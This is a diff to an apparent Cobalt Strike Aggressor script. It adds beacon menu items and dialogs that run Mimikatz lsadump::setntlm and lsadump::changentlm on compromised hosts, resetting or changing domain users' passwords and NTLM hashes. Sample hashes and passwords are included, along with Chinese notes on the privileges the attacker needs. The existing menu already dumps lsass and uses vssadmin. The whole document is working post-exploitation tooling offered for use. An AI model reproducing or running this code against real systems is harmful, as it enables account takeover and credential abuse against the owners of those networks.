@@ -137,6 +137,73 @@ sub vssadmindump{
 	}
 }
 
+
+sub setntlm_{
+  foreach $id ($bid){
+   if(-isadmin $id){
+    bmimikatz($id, "lsadump::setntlm /server:$3['domain'] /user:$3['user'] /password:$3['password']");
+   }else{
+    blog2($id, "[-] $id Not Administrator Privilege");
+   } 
+  }
+}
+
+sub changentlm_{
+  foreach $id ($bid){
+    if(-isadmin $id){
+      bmimikatz($id, "lsadump::changentlm /server:$3['domain'] /user:$3['user'] /old:$3['old'] /newpassword:$3['newpassword']");
+   }else{
+      blog2($id, "[-] $id Not Administrator Privilege");
+   }
+  }
+}
+
+sub changentlm2_{
+  foreach $id ($bid){
+    if(-isadmin $id){
+      bmimikatz($id, "lsadump::changentlm /server:$3['domain'] /user:$3['user'] /oldpassword:$3['oldpassword'] /new:$3['newntlm']");
+   }else{
+      blog2($id, "[-] $id Not Administrator Privilege");
+   }
+  }
+}
+
+
+
+sub setntlm{
+  $dialog = dialog("setntlm" ,%(bid => $bid ,domain => "WORKGROUP" ,user => "Administrator"  ,password => "Hxc123456"), &setntlm_);
+  dialog_description($dialog, "SetNTLM，基本是攻击者拿到较高权限时才会进行的操作，因此主要靠我们前期的一些用户实体行权限要求:用户拥有指定用户的重置密码");
+  drow_text($dialog, "user", "user:");
+  drow_text($dialog, "domain", "domain:");
+  drow_text($dialog, "password", "password:");
+  dbutton_action($dialog, "RUN");
+  dialog_show($dialog);
+}
+
+sub changentlm{
+  $dialog = dialog("changentlm" ,%(bid => $bid ,domain => "WORKGROUP" ,user => "Administrator" ,old => "ca69e7f0f02d9156d1616ba6abd395b6"  ,newpassword => "Hxc123456"), &changentlm_);
+  dialog_description($dialog, "需要对目标用户有Change Password权限，但该权限一般是Everyone拥有的，所以基本上拿到目标用户的hash/密码后都可以进行密码更改");
+  drow_text($dialog, "user", "user:");
+  drow_text($dialog, "domain", "domain:");
+  drow_text($dialog, "old", "oldntlm:");
+  drow_text($dialog, "newpassword", "newpassword:");
+  dbutton_action($dialog, "RUN");
+  dialog_show($dialog);
+}
+
+sub changentlm2{
+  $dialog = dialog("changentlm" ,%(bid => $bid ,domain => "WORKGROUP" ,user => "Administrator" ,oldpassword => "Hxc123456!"  ,newntlm => "ca69e7f0f02d9156d1616ba6abd395b6"), &changentlm2_);
+  dialog_description($dialog, "需要对目标用户有Change Password权限，但该权限一般是Everyone拥有的，所以基本上拿到目标用户的hash/密码后都可以进行密码更改");
+  drow_text($dialog, "user", "user:");
+  drow_text($dialog, "domain", "domain:");
+  drow_text($dialog, "oldpassword", "oldpassword:");
+  drow_text($dialog, "newntlm", "newntlm:");
+  dbutton_action($dialog, "RUN");
+  dialog_show($dialog);
+}
+
+
+
 popup beacon_bottom{
 	menu "&dump lsass"{
 		$bid = $1;
@@ -163,5 +230,19 @@ popup beacon_bottom{
 		item "&vssadmin dump"{
 			vssadmindump($bid);
 		}
-	}
+  }
+  
+   menu "&修改用户密码"{
+      item "&SetNtlm修改账户密码"{
+        setntlm($bid); 
+      }
+
+      item "&ChangNtlm修改用户密码"{
+        changentlm($bid);
+      }
+
+      item "&ChangNtlm恢复用户密码"{
+        changentlm2($bid);
+      }
+    }
 }
